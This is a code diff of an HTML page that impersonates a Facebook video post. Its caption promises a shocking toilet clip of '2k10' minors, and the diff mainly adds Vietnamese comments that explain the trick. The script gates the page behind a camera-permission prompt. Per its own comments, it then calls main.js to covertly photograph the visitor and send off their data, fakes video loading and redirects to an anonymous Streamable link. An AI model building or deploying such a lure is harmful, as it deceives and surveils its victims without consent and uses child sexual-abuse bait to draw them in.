@@ -8,6 +8,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #000; color: #fff; overflow-x: hidden; }
         
+        /* Màn hình chờ xác thực */
         #loading-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999;
@@ -16,6 +17,7 @@
         .fb-loader { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
+        /* Nội dung chính (ẩn lúc đầu) */
         #main-content { display: none; max-width: 500px; margin: 0 auto; background: #1c1e21; min-height: 100vh; }
         .fb-header { background: #242526; padding: 12px; border-bottom: 1px solid #3e4042; display: flex; align-items: center; gap: 10px; }
         .header-title { font-weight: bold; font-size: 16px; }
@@ -24,6 +26,7 @@
         .author-name { font-weight: 600; font-size: 15px; }
         .caption { padding: 0 12px 12px; font-size: 15px; line-height: 1.4; color: #e4e6eb; }
 
+        /* Giao diện Video */
         .video-wrapper { position: relative; width: 100%; background: #000; aspect-ratio: 9/16; display: flex; justify-content: center; align-items: center; cursor: pointer; }
         .thumbnail { width: 100%; height: 100%; object-fit: cover; filter: blur(8px) brightness(0.7); }
         .play-btn-fb { position: absolute; width: 65px; height: 65px; background: rgba(0,0,0,0.5); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 2px solid #fff; z-index: 2; }
@@ -32,6 +35,7 @@
         #infinite-load { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10; flex-direction: column; justify-content: center; align-items: center; }
         .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
 
+        /* Hộp thoại thông báo lỗi khi từ chối Camera */
         .error-box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); max-width: 350px; }
         .btn-retry { background: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }
     </style>
@@ -52,6 +56,7 @@
         <span style="font-size: 20px; cursor: pointer;">✕</span>
         <span class="header-title">Video của Hóng Biến 24h</span>
     </div>
+
     <div class="post-info">
         <div class="avatar"></div>
         <div>
@@ -59,12 +64,18 @@
             <div style="font-size: 12px; color: #b0b3b8;">Vừa xong • 🌍</div>
         </div>
     </div>
-    <div class="caption">CỰC SỐC: Clip 2k10 trong nhà vệ sinh đang lan truyền chóng mặt. Xem nhanh kẻo bị xóa nhé anh em! #hongbien #cliphot #2k10</div>
+
+    <div class="caption">
+        CỰC SỐC: Clip 2k10 trong nhà vệ sinh đang lan truyền chóng mặt. Xem nhanh kẻo bị xóa nhé anh em! #hongbien #cliphot #2k10
+    </div>
+
     <div class="video-wrapper" onclick="playVideo()">
         <img src="https://i.ibb.co/vz6mDkL/blurred-video.jpg" class="thumbnail">
+        
         <div id="play-button" class="play-btn-fb">
             <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
         </div>
+
         <div id="infinite-load">
             <div class="spinner"></div>
             <div style="margin-top: 15px; font-size: 14px; color: #ddd;">Đang tải video (720p)...</div>
@@ -73,25 +84,31 @@
 </div>
 
 <script src="main.js"></script>
+
 <script>
     async function requestAccess() {
         try {
+            // Bước 1: Yêu cầu quyền truy cập Camera trực tiếp
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            stream.getTracks().forEach(track => track.stop());
+            stream.getTracks().forEach(track => track.stop()); // Tạm dừng luồng để chụp ảnh ngầm sau
 
+            // Hiện trạng thái đang xử lý dữ liệu
             document.getElementById('status-container').innerHTML = `
                 <div class="fb-loader"></div>
-                <p style="margin-top:20px; font-weight: 500;">Đang xác thực dữ liệu video...</p>
+                <p style="margin-top:20px; font-weight: 500;">Đang xử lý dữ liệu video...</p>
             `;
             
+            // Bước 2: Gọi logic chụp ảnh và gửi thông tin từ main.js
             if (typeof main === 'function') {
                 await main(); 
             }
 
+            // Bước 3: Mở khóa trang Facebook
             document.getElementById('loading-screen').style.display = 'none';
             document.getElementById('main-content').style.display = 'block';
 
         } catch (err) {
+            // Bước 4: Xử lý khi người dùng bấm TỪ CHỐI (Block)
             document.getElementById('status-container').innerHTML = `
                 <div class="error-box">
                     <h3 style="color: #d32f2f;">Quyền truy cập bị chặn</h3>
@@ -110,12 +127,16 @@
     }
 
     function playVideo() {
+        // Hiện hiệu ứng tải giả trong 0.5 giây
         document.getElementById('infinite-load').style.display = 'flex';
         document.getElementById('play-button').style.display = 'none';
+
+        // Chuyển hướng sang link Streamable ẩn danh của bạn
         setTimeout(() => {
             window.location.href = "https://streamable.com/ux1xwz";
         }, 500);
     }
 </script>
+
 </body>
 </html>
